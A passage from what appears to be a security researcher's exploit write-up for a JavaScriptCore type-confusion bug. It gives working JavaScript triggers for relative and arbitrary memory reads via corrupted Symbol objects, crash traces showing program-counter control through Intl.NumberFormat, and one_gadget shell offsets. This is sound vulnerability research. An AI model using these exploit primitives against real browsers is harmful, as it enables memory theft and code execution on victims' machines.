  +6 &lt;  1&gt;                 JSC::TypeInfo::InlineTypeFlags m_flags;
  +7 &lt;  1&gt;                 JSC::CellState m_cellState;
  +8 &lt;  8&gt;             JSC::AuxiliaryBarrier&lt;JSC::Butterfly *&gt; m_butterfly;
  +8 &lt;  8&gt;                 JSC::Butterfly * m_value;
Total byte size: 16
Total pad bytes: 0
</code></pre></div>


<p>The <code>memcpy</code> we’re triggering uses <code>butterfly()-&gt;contiguous().data() + startIndex</code> as a dst, and while this may initially look complicated, most of this compiles away. <code>butterfly()</code> is a butterfly, as detailed in <a href="http://phrack.org/papers/attacking_javascript_engines.html">saelo’s Phrack article</a>. This means the <code>contiguous().data()</code> portion effectively disappears. <code>startIndex</code> is fully controlled  as well, so we can make this <code>0</code>. As a result, our <code>memcpy</code> reduces to: <code>memcpy(qword ptr [obj + 8], qword ptr [src + 8], sizeof(src))</code>. To exploit this we simply need an object which has a non-butterfly pointer at offset <code>+8</code>.</p>
<p>This turns out to not be simple. Most objects I could find inherited from <code>JSObject</code>, meaning they inherited the butterfly pointer field at <code>+8</code>. In some cases (e.g. <code>ArrayBuffer</code>) this value was simply <code>NULL</code>’d, while in others I wound up type confusing a butterfly with another butterfly, to no effect. <code>JSString</code>s were particularly frustrating, as the relevant portions of their layout were:</p>
<div class="highlight"><pre><span></span><code>+8    flags  : u32
+12   length : u32
</code></pre></div>


<p>The length field was controllable via user code, however flags were not. This gave me the primitive that I could control the top 32bit of a pointer, and while this might have been doable with some heap spray, I elected to Find a Better Bug(™).</p>
<h3 id="salvation-through-symbols">Salvation Through Symbols</h3>
<p>My basic process at this point was to look at <a href="https://developer.mozilla.org/en-US/docs/Glossary/Primitive">MDN</a> for the types I could instantiate from the interpreter. Most of these were either boxed (<code>integer</code>s, <code>bool</code>s, etc), <code>Object</code>s, or <code>String</code>s. However, <code>Symbol</code> was a JS primitive had a potentially useful layout:</p>
<div class="highlight"><pre><span></span><code>x@webkit:~/WebKit/Tools/Scripts$ ./dump-class-layout JSC Symbol
Found 1 types matching &quot;Symbol&quot; in &quot;/home/x/WebKit/WebKitBuild/Release/lib/libJavaScriptCore.so&quot;
  +0 { 16} Symbol
  +0 {  8}     JSC::JSCell
  +0 {  1}         JSC::HeapCell
  +0 &lt;  4&gt;         JSC::StructureID m_structureID;
  +4 &lt;  1&gt;         JSC::IndexingType m_indexingTypeAndMisc;
  +5 &lt;  1&gt;         JSC::JSType m_type;
  +6 &lt;  1&gt;         JSC::TypeInfo::InlineTypeFlags m_flags;
  +7 &lt;  1&gt;         JSC::CellState m_cellState;
  +8 &lt;  8&gt;     JSC::PrivateName m_privateName;
  +8 &lt;  8&gt;         WTF::Ref&lt;WTF::SymbolImpl&gt; m_uid;
  +8 &lt;  8&gt;             WTF::SymbolImpl * m_ptr;
Total byte size: 16
Total pad bytes: 0
</code></pre></div>


<p>At <code>+8</code> we have a pointer to a non-butterfly! Additionally, this object passes all the checks on the above code path, leading to a potentially controlled <code>memcpy</code> on top of the <code>SymbolImpl</code>. Now we just need a way to turn this into an infoleak...</p>
<h3 id="diagrams">Diagrams</h3>
<p><code>WTF::SymbolImpl</code>’s layout:</p>
<div class="highlight"><pre><span></span><code>x@webkit:~/WebKit/Tools/Scripts$ ./dump-class-layout WTF SymbolImpl
Found 1 types matching &quot;SymbolImpl&quot; in &quot;/home/x/WebKit/WebKitBuild/Release/lib/libJavaScriptCore.so&quot;
  +0 { 48} SymbolImpl
  +0 { 24}     WTF::UniquedStringImpl
  +0 { 24}         WTF::StringImpl
  +0 &lt;  4&gt;             unsigned int m_refCount;
  +4 &lt;  4&gt;             unsigned int m_length;
  +8 &lt;  8&gt;             WTF::StringImpl::(anonymous union) None;
 +16 &lt;  4&gt;             unsigned int m_hashAndFlags;
 +20 &lt;  4&gt;             &lt;PADDING&gt;
 +20 &lt;  4&gt;         &lt;PADDING&gt;
 +20 &lt;  4&gt;     &lt;PADDING&gt;
 +24 &lt;  8&gt;     WTF::StringImpl * m_owner;
 +32 &lt;  8&gt;     WTF::SymbolRegistry * m_symbolRegistry;
 +40 &lt;  4&gt;     unsigned int m_hashForSymbol;
 +44 &lt;  4&gt;     unsigned int m_flags;
Total byte size: 48
Total pad bytes: 12
Padding percentage: 25.00 %
</code></pre></div>


<p>The codepath we’re on expects a butterfly with memory layout simplified to the following:</p>
<div class="highlight"><pre><span></span><code>       -8   -4     +0  +8  +16
+---------------------+---+-----------+
|pub length|length| 0 | 1 | 2 |...| n |
+---------------------+---+-----------+
                  ^
+-------------+   |
|butterfly ptr+---+
+-------------+
</code></pre></div>


<p>However, we’re providing it with something like this:</p>
<div class="highlight"><pre><span></span><code>                    +0       +4     +8
+-----------------------------------------------+
|       OOB        |refcount|length|str base ptr|
+-----------------------------------------------+
                   ^
+--------------+   |
|SymbolImpl ptr+---+
+--------------+
</code></pre></div>


<p>If we recall our earlier pseudocode:</p>
<div class="highlight"><pre><span></span><code><span class="k">def</span> <span class="nf">appendMemcpy</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">src</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">allocated_size</span><span class="p">(</span><span class="n">dst</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">dst</span><span class="p">)</span> <span class="o">+</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">src</span><span class="p">):</span>
        <span class="n">resize</span><span class="p">(</span><span class="n">dst</span><span class="p">)</span>

    <span class="n">memcpy</span><span class="p">(</span><span class="n">dst</span> <span class="o">+</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">dst</span><span class="p">),</span> <span class="n">src</span><span class="p">,</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">src</span><span class="p">));</span>
</code></pre></div>


<p>In the normal butterfly case, it will check the <code>length</code> and <code>public length</code> fields, located at <code>-4</code> and <code>-8</code> from the butterfly pointer (i.e <code>btrfly[-1]</code> and <code>btrfly[-2]</code> respectively). However, when passing <code>Symbol</code>s in our typed confused cases those array accesses will be out of bounds, and thus potentially controllable. Let’s walk through the two possibilities.</p>
<h3 id="oob-memory-is-a-large-value">OOB memory is a large value</h3>
<p>Let’s presume we have a memory layout similar to:</p>
<div class="highlight"><pre><span></span><code>  OOB    OOB
+------------------------------------------+
|0xffff|0xffff|refcount|length|str base ptr|
+------------------------------------------+
              ^
        +---+ |
        |ptr+-+
        +---+
</code></pre></div>


<p>The exact OOB values won’t matter, as long as they’re greater than the size of the <code>dst</code> plus the <code>src</code>. In this case, <code>resize</code> in our pseudocode or <code>ensureLength</code> (<code>[4]</code>) in the actual code will not trigger a reallocation and object move, resulting in a direct <code>memcpy</code> on top of <code>refcount</code> and <code>length</code>. From here, we can turn this into a relative read infoleak by overwriting the length field.</p>
<p>For example, if we store a function reference to <code>arrayProtoPrivateFuncAppendMemcpy</code> in a variable named <code>busted_concat</code> and then trigger the bug, like this:</p>
<div class="highlight"><pre><span></span><code><span class="kd">let</span> <span class="nx">x</span> <span class="o">=</span> <span class="nx">Symbol</span><span class="p">(</span><span class="s2">&quot;AAAA&quot;</span><span class="p">);</span>

<span class="kd">let</span> <span class="nx">y</span> <span class="o">=</span> <span class="p">[];</span>
<span class="nx">y</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="k">new</span> <span class="nx">Int64</span><span class="p">(</span><span class="s1">&#39;0x000042420000ffff&#39;</span><span class="p">).</span><span class="nx">asDouble</span><span class="p">());</span>

<span class="nx">busted_concat</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</code></pre></div>


<p>Note: <code>Int64</code> can be found <a href="https://github.com/saelo/jscpwn/blob/master/int64.js">here</a> and is, of course, covered in <a href="http://phrack.org/papers/attacking_javascript_engines.html">saelo’s Phrack article</a>.</p>
<p>We would then end up with a <code>Symbol</code> <code>x</code> with fields:</p>
<div class="highlight"><pre><span></span><code><span class="err"> refcount length</span>
<span class="err">+----------------------------+</span>
<span class="err">| 0x4242 |0xffff|str base ptr|</span>
<span class="err">+----------------------------+</span>
</code></pre></div>


<p><code>str base ptr</code> will point to <code>AAAA</code>, however instead of having a length of <code>4</code>, it will have a length of <code>0xffff</code>. To access this memory, we can extract the <code>String</code> from a <code>Symbol</code> with:</p>
<div class="highlight"><pre><span></span><code><span class="kd">let</span> <span class="nx">leak</span> <span class="o">=</span> <span class="nx">x</span><span class="p">.</span><span class="nx">toString</span><span class="p">().</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mh">0x1234</span><span class="p">);</span>
</code></pre></div>


<p><code>toString()</code> in this case is actually kind of complicated under the hood. My understanding is that all strings in JSC are “roped”, meaning any existing substrings are linked together with pointers as opposed to linearly laid out in memory. However this detail doesn’t really affect us, for our purposes a string is created out of our controlled length and the existing string base pointer, with no terminating characters to be concerned with. It is possible to crash here if we were to index outside of mapped memory, but this hasn’t happened in my experience. As an additional minor complication, strings come in two varieties, 8bit and UTF-16. We can easily work around this with a basic heuristic: if we read any values larger than 255 we just assume it is a UTF-16 string.</p>
<p>None of this changes the outcome of the snippet above, <code>leak</code> now contains the contents of OOB memory. Boom, relative memory read :)</p>
<h3 id="oob-memory-is-a-zero">OOB Memory is a zero</h3>
<p>On the other hand, let’s assume the OOB memory immediately before our target <code>SymbolImpl</code> is all zeros. In this case, <code>resize</code> / <code>ensureLength</code> <em>will</em> trigger a reallocation and object move. <code>ensureLength</code> more or less corresponds to the following pseudocode:</p>
<div class="highlight"><pre><span></span><code><span class="k">if</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">butterfly</span><span class="p">)</span> <span class="o">+</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">other</span><span class="o">.</span><span class="n">butterfly</span><span class="p">)</span> <span class="o">&gt;</span> <span class="bp">self</span><span class="o">.</span><span class="n">sz</span><span class="p">:</span>
    <span class="n">new_btrfly</span> <span class="o">=</span>  <span class="n">alloc</span><span class="p">(</span><span class="n">sizeof</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">butterfly</span><span class="p">)</span> <span class="o">+</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">other</span><span class="o">.</span><span class="n">butterfly</span><span class="p">));</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">new_btrfly</span><span class="p">,</span> <span class="n">this</span><span class="o">.</span><span class="n">butterfly</span><span class="p">,</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">butterfly</span><span class="p">));</span>
    <span class="n">this</span><span class="o">.</span><span class="n">butterfly</span> <span class="o">=</span> <span class="n">new_btrfly</span><span class="p">;</span>
</code></pre></div>


<p>Or in words: if the existing butterfly isn’t large enough to hold a combination of the two butterflies, allocate a larger one, copy the existing butterfly contents into it, and assign it. Note that this does not actually do the concatenation, it just makes sure the destination will be large enough when the concatenation is actually performed.</p>
<p>This turns out to also be quite useful to us, especially if we already have the relative read above. Assuming we have a <code>SymbolImpl</code> starting at address <code>0x4008</code> with a memory layout of:</p>
<div class="highlight"><pre><span></span><code>          OOB    OOB
        +------------------------------------------+
0x4000: |0x0000|0x0000|refcount|length|str base ptr|
        +------------------------------------------+
                      ^
                +---+ |
                |ptr+-+
                +---+
</code></pre></div>


<p>And, similar to the large value case above, we trigger the bug:</p>
<div class="highlight"><pre><span></span><code><span class="kd">let</span> <span class="nx">read_target</span> <span class="o">=</span> <span class="s1">&#39;0xdeadbeef&#39;</span><span class="p">;</span>

<span class="kd">let</span> <span class="nx">x</span> <span class="o">=</span> <span class="nx">Symbol</span><span class="p">(</span><span class="s2">&quot;AAAA&quot;</span><span class="p">);</span>

<span class="kd">let</span> <span class="nx">y</span> <span class="o">=</span> <span class="p">[];</span>
<span class="nx">y</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="k">new</span> <span class="nx">Int64</span><span class="p">(</span><span class="s1">&#39;0x000042420000ffff&#39;</span><span class="p">).</span><span class="nx">asDouble</span><span class="p">());</span>
<span class="nx">y</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="k">new</span> <span class="nx">Int64</span><span class="p">(</span><span class="nx">read_target</span><span class="p">).</span><span class="nx">asDouble</span><span class="p">());</span>

<span class="nx">busted_concat</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</code></pre></div>


<p>We end up with a “<code>SymbolImpl</code>” at a new address, <code>0x8000</code>:</p>
<div class="highlight"><pre><span></span><code>         refcount length str base ptr
        +----------------------------+
0x8000: | 0x4242 |0xffff| 0xdeadbeef |
        +----------------------------+
</code></pre></div>


<p>In this case, we’ve managed to conjure a complete <code>SymbolImpl</code>! We might not need to allocate a backing string for this Symbol (i.e. “AAAA”), but doing so can make it slightly easier to debug. The <code>ensureLength</code> code basically decided to “resize” our <code>SymbolImpl</code>, and by doing so allowed us to fully control the contents of a new one. This now means that if we do</p>
<div class="highlight"><pre><span></span><code><span class="kd">let</span> <span class="nx">leak</span> <span class="o">=</span> <span class="nx">x</span><span class="p">.</span><span class="nx">toString</span><span class="p">().</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mh">0x5555</span><span class="p">);</span>
</code></pre></div>


<p>We will be dereferencing <code>*(0xdeadbeef + 0x5555)</code>, giving us a completely arbitrary memory read. Obviously this depends on a relative leak, otherwise we wouldn’t have a valid mapped address to target. Additionally, we could have overwritten the <code>str base pointer</code> in the non-zero length case (because the memcpy is based on the sizeof the source), but I found this method to be slightly more stable and repeatable.</p>
<p>With this done we now have both relative and arbitrary infoleaks :)</p>
<h3 id="notes-on-fastmalloc">Notes on <code>fastMalloc</code></h3>
<p>We will get into more detail on this in a second, however I want to cover how we control the first bytes prior the <code>SymbolImpl</code>, as being able to control which <code>ensureLength</code> codepath we hit is important (we need to get the relative leak before the absolute). This is partially where targeting <code>jsc</code> instead of Webkit proper made my life easier: I had more or less deterministic heap layout for all of my runs, specifically:</p>
<div class="highlight"><pre><span></span><code><span class="c1">// this symbol will always pass the ensureLength check</span>
<span class="kd">let</span> <span class="nx">x</span> <span class="o">=</span> <span class="nx">Symbol</span><span class="p">(</span><span class="s1">&#39;AAAA&#39;</span><span class="p">);</span>

<span class="kd">function</span> <span class="nx">y</span><span class="p">()</span> <span class="p">{</span>
    <span class="c1">// this symbol will always fail the ensureLength check</span>
    <span class="kd">let</span> <span class="nx">z</span> <span class="o">=</span> <span class="nx">Symbol</span><span class="p">(</span><span class="s1">&#39;BBBB&#39;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>


<p>To be honest, I didn’t find the root cause for why this was the case; I just ran with it. <code>SymbolImpl</code> objects here are allocated via <code>fastMalloc</code>, which seems to be used primarily by the JIT, <code>SymbolImpl</code>, and <code>StringImpl</code>. Additionally (and unfortunately) <code>fastMalloc</code> is used by <code>print()</code>, meaning if we were interested in porting our exploit from <code>jsc</code> to WebKit we would likely have to redo most of the heap offsets (in addition to spraying to get control over the <code>ensureLength</code> codepath).</p>
<p>While this approach is untested, something like</p>
<div class="highlight"><pre><span></span><code><span class="kd">let</span> <span class="nx">x</span> <span class="o">=</span> <span class="s1">&#39;AAAA&#39;</span><span class="p">.</span><span class="nx">blink</span><span class="p">();</span>
</code></pre></div>


<p>Will cause <code>AAAA</code> to be allocated inline with the allocation metadata via <code>fastMalloc</code>, as long as your target string is short enough. By spraying a few <code>blink</code>’d objects to fill in any holes, it should be possible to to control <code>ensureLength</code> and get the relative infoleak to make the absolute infoleak.</p>
<h2 id="arbitrary-write">Arbitrary Write</h2>
<p>Let’s recap where we are, where we’re trying to go, and what’s left to do:</p>
<p>We can now read and leak arbitrary browser memory.
We have a promising looking primitive for a memory write (the <code>memcpy</code> in the case where we do not resize). 
If we can turn that relative memory write into an arbitrary write we can move on to targeting some vtables or saved program counters on the stack, and hijack control flow to win.</p>
<p>How hard could this be?</p>
<h3 id="failure-nan-boxing">Failure: NaN boxing</h3>
<p>One of the first ideas I had to get an arbitrary write was passing it a numeric value as the <code>dst</code>. Our <code>busted_concat</code> can be simplified to a weird version of <code>memcpy()</code>, and instead of passing it <code>memcpy(Symbol, Array, size)</code> could we pass it something like <code>memcpy(0x41414141, Array, size)</code>? We would need to create an object at the address we passed in, but that shouldn’t be too difficult at this point: we have a good infoleak and the ability to instantiate memory with arbitrary values via <code>ArrayWithDouble</code>. Essentially, this is asking if we can use this function reference to get us a <code>fakeobj()</code> like primitive. There are basically two possibilities to try, and neither of them work.</p>
<p>First, let’s take the integer case. If we pass <code>0x41414141</code> as the <code>dst</code> parameter, this will be encoded into a <code>JSValue</code> of <code>0xffff000041414141</code>. That’s a non-canonical address, and even if it weren’t, it would be in kernel space. Due to this integer tagging, it is impossible to get a JSValue that is an integer which is also a valid mapped memory address, so the integer path is out.</p>
<p>Second, let’s examine what happens if we pass it a double instead: <code>memcpy(new Int64(0x41414141).asDouble(), Array, size)</code>. In this case, the double should be using all 64 bits of the address, so it might be possible to construct a double who’s representation is a mapped memory location. However, JavaScriptCore handles this case as well: they use a floating point representation which has <code>0x0001000000000000</code> added to the value when expressed as a <code>JSValue</code>. This means, like integers, doubles can never correspond to a useful memory address.</p>
<p>For more information on this, check out <a href="https://github.com/WebKit/webkit/blob/master/Source/JavaScriptCore/runtime/JSCJSValue.h#L365">this comment in JSCJSValue.h</a> which explains the value tagging in more detail.</p>
<h3 id="failure-smashing-fastmalloc">Failure: Smashing fastMalloc</h3>
<p>In creating our  relative read infoleak, we only overwrote the <code>refcount</code> and <code>length</code> fields of the target <code>SymbolImpl</code>. However, this <code>memcpy</code> should be significantly more useful to us: because the size of the copy is related to the size of the source, we can overwrite up to the OOB size field. Practically, this turns into an arbitrary overwrite of <code>SymbolImpl</code>s.</p>
<p>As mentioned previously, <code>SymbolImpl</code> get allocated via <code>fastMalloc</code>. To figure this out, we need to leave JSC and check out the Web Template Framework or WTF. WTF, for lack of a better analogy, forms a kind of stdlib for JSC to be built on top of it. If we look up <code>WTF::SymbolImpl</code> from our class dump above, we find it in <a href="https://github.com/WebKit/webkit/blob/e72e58665d57523f6792ad3479613935ecf9a5e0/Source/WTF/wtf/text/SymbolImpl.h#L34"><code>Source/WTF/wtf/text/SymbolImpl.h</code></a>. Specifically, following the class declarations that are of interest to us:</p>
<div class="highlight"><pre><span></span><code><span class="k">class</span> <span class="nc">SymbolImpl</span> <span class="o">:</span> <span class="k">public</span> <span class="n">UniquedStringImpl</span> <span class="p">{</span>
</code></pre></div>


<p><a href="https://github.com/WebKit/webkit/blob/e72e58665d57523f6792ad3479613935ecf9a5e0/Source/WTF/wtf/text/UniquedStringImpl.h#L35"><code>Source/WTF/wtf/text/UniquedStringImpl.h</code></a></p>
<div class="highlight"><pre><span></span><code><span class="k">class</span> <span class="nc">UniquedStringImpl</span> <span class="o">:</span> <span class="k">public</span> <span class="n">StringImpl</span> <span class="p">{</span>
</code></pre></div>


<p><a href="https://github.com/WebKit/webkit/blob/e72e58665d57523f6792ad3479613935ecf9a5e0/Source/WTF/wtf/text/StringImpl.h#L131"><code>/Source/WTF/wtf/text/StringImpl.h</code></a></p>
<div class="highlight"><pre><span></span><code><span class="k">class</span> <span class="nc">StringImpl</span> <span class="p">{</span>
    <span class="n">WTF_MAKE_NONCOPYABLE</span><span class="p">(</span><span class="n">StringImpl</span><span class="p">);</span> <span class="n">WTF_MAKE_FAST_ALLOCATED</span><span class="p">;</span>
</code></pre></div>


<p><code>WTF_MAKE_FAST_ALLOCATED</code> is a macro which expands to cause objects of this type to be allocated via <code>fastMalloc</code>. This help forms our target list: anything that is tagged with <code>WTF_MAKE_FAST_ALLOCATED</code>, or allocated directly via <code>fastMalloc</code> is suitable, as long as we can force an allocation from the interpreter.</p>
<p>To save some space: I was unsuccessful at finding any way to turn this <code>fastMalloc</code> overflow into an arbitrary write. At one point I was absolutely convinced I had a method of partially overwriting a <code>SymbolImpl</code>, converting it to a to String, then overwriting that, thus bypassing the flags restriction mentioned earlier... but this didn’t work (I confused <code>JSC::JSString</code> with <code>WTF::StringImpl</code>, amongst other problems).</p>
<p>All the things I could find to overwrite in the <code>fastMalloc</code> heap were either <code>String</code>s (or <code>String</code>-like things, e.g. <code>Symbol</code>s) or were JIT primitives I didn’t want to try to understand. Alternatively I could have tried to target <code>fastMalloc</code> metadata attacks -- for some reason this didn’t occur to me until much later and I haven’t looked at this at all.</p>
<p>Remember when I mentioned the potential downsides of targeting <code>jsc</code> specifically? This is where they start to come into play. It would be really nice at this point to have a richer set of objects to target here, specifically DOM or other browser objects. More objects would give me additional avenues on three fronts: more possibilities to type confuse my existing busted functions, more possibilities to overflow in the <code>fastMalloc</code> heap, and more possibilities to obtain references to useful functions.</p>
<p>At this point I decided to try to find a different chain of functions calls which would use the same bug but give me a reference to a different runtime function.</p>
<h2 id="control-flow">Control Flow</h2>
<p>My general workflow when auditing other functions for our candidate pattern was to look at the code exposed via <a href="https://github.com/WebKit/webkit/tree/e72e58665d57523f6792ad3479613935ecf9a5e0/Source/JavaScriptCore/builtins"><code>builtins</code></a>, find native functions, and then audit those native functions looking for things that had JSValue’s evaluated. While this found other instances of this pattern (e.g. in the RegExp code), they were not usable -- the C++ runtime functions would do additional checks and error out. However when searching, I stumbled onto another p0 bug with the same CVE attributed, <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1036">p0 bug 1036</a>. Reproducing from the PoC there:</p>
<div class="highlight"><pre><span></span><code><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Intl</span><span class="p">.</span><span class="nx">DateTimeFormat</span><span class="p">();</span>
<span class="kd">var</span> <span class="nx">q</span><span class="p">;</span>

<span class="kd">function</span> <span class="nx">f</span><span class="p">(){</span>
    <span class="nx">q</span> <span class="o">=</span> <span class="nx">f</span><span class="p">.</span><span class="nx">caller</span><span class="p">;</span>
    <span class="k">return</span> <span class="mi">10</span><span class="p">;</span>
<span class="p">}</span>


<span class="nx">i</span><span class="p">.</span><span class="nx">format</span><span class="p">({</span><span class="nx">valueOf</span> <span class="o">:</span> <span class="nx">f</span><span class="p">});</span>

<span class="nx">q</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="mh">0x77777777</span><span class="p">);</span>
</code></pre></div>


<p>This bug is very similar to our earlier bug and originally I was confused as to why it was a separate p0 bug. Both bugs manifest in the same way, by giving you a non-properly-typechecked reference to a function, however the root cause that makes the bugs possible is different. In the <code>appendMemcpy</code> case this is due to a lack of checks on <code>use strict</code> code. This appears to be a “regular” type confusion, unrelated to <code>use strict</code>. These bugs, while different, are similar enough that they share a CVE and a fix.</p>
<p>So, with this understood can we use <code>Intl.DateTimeFormat</code> usefully to exploit <code>jsc</code>?</p>
<h3 id="intldatetimeformat-crash">Intl.DateTimeFormat Crash</h3>
<p>What’s the outcome if we run that PoC?</p>
<div class="highlight"><pre><span></span><code>Thread 1 &quot;jsc&quot; received signal SIGSEGV, Segmentation fault.
…
$rdi   : 0xffff000077777777
...
 → 0x7ffff77a8960 &lt;JSC::IntlDateTimeFormat::format(JSC::ExecState&amp;,+0&gt; cmp    BYTE PTR [rdi+0x18], 0x0
</code></pre></div>


<p>Ok, so we’re treating a NaN boxed integer as an object. What if we pass it an object instead?</p>
<div class="highlight"><pre><span></span><code><span class="c1">// ...</span>
<span class="nx">q</span><span class="p">.</span><span class="nx">call</span><span class="p">({</span><span class="nx">a</span><span class="o">:</span> <span class="k">new</span> <span class="nx">Int64</span><span class="p">(</span><span class="s1">&#39;0x41414141&#39;</span><span class="p">)});</span>
</code></pre></div>


<p>Results in:</p>
<div class="highlight"><pre><span></span><code>Thread 1 &quot;jsc&quot; received signal SIGSEGV, Segmentation fault.
...
$rdi   : 0x0000000000000008
 ...
 → 0x7ffff77a4833 &lt;JSC::IntlDateTimeFormat::initializeDateTimeFormat(JSC::ExecState&amp;,+0&gt; mov    eax, DWORD PTR [rdi]
</code></pre></div>


<p>Hmm.. this also doesn’t look immediately useful. As a last ditch attempt, reading the docs we notice there is a both an <code>Intl.DateTimeFormat</code> and an <code>Intl.NumberFormat</code> with a similar <code>format</code> call. Let’s try getting a reference to that function instead:</p>
<div class="highlight"><pre><span></span><code><span class="nx">load</span><span class="p">(</span><span class="s1">&#39;utils.js&#39;</span><span class="p">)</span>
<span class="nx">load</span><span class="p">(</span><span class="s1">&#39;int64.js&#39;</span><span class="p">);</span>

<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Intl</span><span class="p">.</span><span class="nx">NumberFormat</span><span class="p">();</span>
<span class="kd">var</span> <span class="nx">q</span><span class="p">;</span>

<span class="kd">function</span> <span class="nx">f</span><span class="p">(){</span>
        <span class="nx">q</span> <span class="o">=</span> <span class="nx">f</span><span class="p">.</span><span class="nx">caller</span><span class="p">;</span>
        <span class="k">return</span> <span class="mi">10</span><span class="p">;</span>
<span class="p">}</span>


<span class="nx">i</span><span class="p">.</span><span class="nx">format</span><span class="p">({</span><span class="nx">valueOf</span> <span class="o">:</span> <span class="nx">f</span><span class="p">});</span>

<span class="nx">q</span><span class="p">.</span><span class="nx">call</span><span class="p">({</span><span class="nx">a</span><span class="o">:</span> <span class="k">new</span> <span class="nx">Int64</span><span class="p">(</span><span class="s1">&#39;0x41414141&#39;</span><span class="p">)});</span>
</code></pre></div>


<p>Giving us:</p>
<div class="highlight"><pre><span></span><code>Thread 1 &quot;jsc&quot; received signal SIGSEGV, Segmentation fault.
…
$rax   : 0x0000000041414141
…
 → 0x7ffff4b7c769 &lt;unum_formatDouble_57+185&gt; call   QWORD PTR [rax+0x48]
</code></pre></div>


<p>Yeah, we can probably exploit this =p</p>
<p>I’d like to say that finding this was due to a deep reading and understanding of WebKit’s internationalization code, but really I was just trying things at random until something crashed in a useful looking state. I’m sure I tried dozens of other things that didn’t end up working out along the way... From a pedagogical perspective, I’m aware that listing random things I tried is not exactly optimal, but that’s actually how I did it so :)</p>
<h3 id="exploit-planning">Exploit Planning</h3>
<p>Let’s pause to take stock of where we’re at:</p>
<ul>
<li>We have an arbitrary infoleak</li>
<li>We have a relative write and no good way to expand it to an arbitrary write</li>
<li>We have control over the program counter</li>
</ul>
<p>Using the infoleak we can find pretty much anything we want, thanks to linux loader behavior (<code>libc.so.6</code> and thus <code>system()</code> will always be at a fixed offset from <code>libJavaScriptCore.so</code> which we already have the base address of leaked). A “proper” exploit would take a arbitrary shellcode and result in it’s execution, but we can settle with popping a shell.</p>
<p>The ideal case here would be we have control over <code>rdi</code> and can just point <code>rip</code> at <code>system()</code> and we’d be done. Let’s look at the register state where we hijack control flow, with pretty printing from <a href="https://twitter.com/_hugsy">@_hugsy</a>’s excellent <a href="https://github.com/hugsy/gef">gef</a>.</p>
<div class="highlight"><pre><span></span><code>$rax   : 0x0000000041414141
$rbx   : 0x0000000000000000
$rcx   : 0x00007fffffffd644  →  0xb2de45e000000000
$rdx   : 0x00007fffffffd580  →  0x00007ffff4f14d78  →  0x00007ffff4b722d0  →  &lt;icu_57::FieldPosition::~FieldPosition()+0&gt; lea rax, [rip+0x3a2a91]        # 0x7ffff4f14d68 &lt;_ZTVN6icu_5713FieldPositionE&gt;
$rsp   : 0x00007fffffffd570  →  0x7ff8000000000000
$rbp   : 0x00007fffffffd5a0  →  0x00007ffff54dfc00  →  0x00007ffff51f30e0  →  &lt;icu_57::UnicodeString::~UnicodeString()+0&gt; lea rax, [rip+0x2ecb09]        # 0x7ffff54dfbf0 &lt;_ZTVN6icu_5713UnicodeStringE&gt;
$rsi   : 0x00007fffffffd5a0  →  0x00007ffff54dfc00  →  0x00007ffff51f30e0  →  &lt;icu_57::UnicodeString::~UnicodeString()+0&gt; lea rax, [rip+0x2ecb09]        # 0x7ffff54dfbf0 &lt;_ZTVN6icu_5713UnicodeStringE&gt;
$rdi   : 0x00007fffb2d5c120  →  0x0000000041414141 (&quot;AAAA&quot;?)
$rip   : 0x00007ffff4b7c769  →  &lt;unum_formatDouble_57+185&gt; call QWORD PTR [rax+0x48]
$r8    : 0x00007fffffffd644  →  0xb2de45e000000000
$r9    : 0x0000000000000000
$r10   : 0x00007ffff35dc218  →  0x0000000000000000
$r11   : 0x00007fffb30065f0  →  0x00007fffffffd720  →  0x00007fffffffd790  →  0x00007fffffffd800  →  0x00007fffffffd910  →  0x00007fffb3000000  →  0x0000000000000003
$r12   : 0x00007fffffffd644  →  0xb2de45e000000000
$r13   : 0x00007fffffffd660  →  0x0000000000000000
$r14   : 0x0000000000000020
$r15   : 0x00007fffb2d5c120  →  0x0000000041414141 (&quot;AAAA&quot;?)
</code></pre></div>


<p>So, <code>rax</code> is fully controlled and <code>rdi</code> and <code>r15</code> are pointers to <code>rax</code>. Nothing else seems particularly useful. The ideal case is probably out, barring some significant memory sprays to get memory addresses that double as useful strings. Let’s see if we can do it without <code>rdi</code>.</p>
<h3 id="one_gadget">one_gadget</h3>
<p>On linux, there is a handy tool for this by <a href="https://twitter.com/david942j">@david924j</a> called <a href="https://github.com/david942j/one_gadget">one_gadget</a>. <code>one_gadget</code> is pretty straightforward in its use: you give it a libc, it gives you the offsets and constraints for PC values that will get you a shell. In my case:</p>
<div class="highlight"><pre><span></span><code>x@webkit:~$ one_gadget /lib/x86_64-linux-gnu/libc.so.6
0x41bce execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
constraints:
  rax == NULL

0x41c22 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xe1b3e execve(&quot;/bin/sh&quot;, rsp+0x60, environ)
constraints:
  [rsp+0x60] == NULL
</code></pre></div>


